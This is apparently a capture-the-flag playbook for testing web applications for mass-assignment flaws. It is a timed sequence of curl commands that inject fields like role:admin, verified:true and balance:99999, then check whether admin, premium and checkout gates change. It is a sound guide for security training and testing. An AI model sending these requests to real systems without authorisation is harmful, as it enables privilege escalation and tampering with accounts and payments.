# First hour deep — the sixty-minute mass-assignment engagement

## 0–10 min — the setup and field inventory

```bash
python3 tools/state.py <name> --category web --target <url>
curl -i "$BASE"                                    # headers, stack
curl -s -b "$JAR" "$BASE/api/me" | jq 'keys'       # field inventory
python3 tools/web/bundle_miner.py --url <bundle> --out /tmp/bundle
grep -rn 'role\|admin\|balance\|verified\|price\|plan\|perm' /tmp/bundle/
```

The field inventory: every key `GET` returns is a candidate writable
field. The bundle: the JS's constructed objects name the model's real
fields.

## 10–20 min — the endpoint map and binder fingerprint

```bash
grep -rn 'app.post\|app.patch\|app.put\|router\.\|@app.route' \
  /tmp/bundle/ src/ routes/ 2>/dev/null
```

Every body-accepting endpoint is a binder. Headers/errors fingerprint
the stack → the binder family:

| Stack | Binder | Grammar |
|---|---|---|
| Express | merge-all or strict | flat + nested JSON |
| Rails | strong params | `user[role]=admin` |
| Laravel | `$fillable` | flat + `role[]` |
| Django | ModelForm vs `create(**)` | flat |
| Spring | bean binding | flat + nested |
| ASP.NET | `[Bind]` | `Role` case-insensitive |

## 20–30 min — the control/canary pair

```bash
# control
curl -X PATCH "$BASE/users/me" -H 'Content-Type: application/json' \
  -b "$JAR" -d '{"display_name":"x"}' > ctrl.txt

# canary — ONE extra field
curl -X PATCH "$BASE/users/me" -H 'Content-Type: application/json' \
  -b "$JAR" -d '{"display_name":"x","role":"admin"}' > canary.txt

# read-back — DIFFERENT endpoint
curl -b "$JAR" "$BASE/api/me" > rb.txt
```

Or the tool:

```bash
python3 tools/web/binding_probe.py --url "$BASE/api/register" \
  --body 'username=p&password=x' --readback "$BASE/api/me"
```

## 30–40 min — read the result

| `rb.txt` | Verdict | Next |
|---|---|---|
| `role:"admin"` | stored → leg 4 | `GET /admin` |
| `role:"user"` | endpoint falsifier | nested → form → PUT |
| `400` | schema falsifier | form → multipart |
| `role` absent | serializer-hidden | exercise directly |

## 40–50 min — the tunnels

```bash
curl -X PATCH "$BASE/users/me" -d '{"profile":{"role":"admin"}}' -b "$JAR"
curl -X PATCH "$BASE/users/me" -d 'role=admin' -b "$JAR"   # form
curl -X PATCH "$BASE/users/me" -d '{"verified":true}' -b "$JAR"
curl -X PATCH "$BASE/users/me" -d '{"balance":99999}' -b "$JAR"
curl -X PATCH "$BASE/users/me" -d '{"groups":[{"id":1}]}' -b "$JAR"
curl -X PUT "$BASE/users/me" -d '{"username":"x","role":"admin",...full}' -b "$JAR"
```

## 50–60 min — the decision exercise

```bash
curl -b "$JAR" "$BASE/admin"            # role gate
curl -b "$JAR" "$BASE/flag"             # verify gate
curl -b "$JAR" "$BASE/premium"          # plan gate
curl -b "$JAR" -X POST "$BASE/checkout" # totals gate
```

Stored + decision-changed = confirmed → `post-probe confirms` → the
flag path.
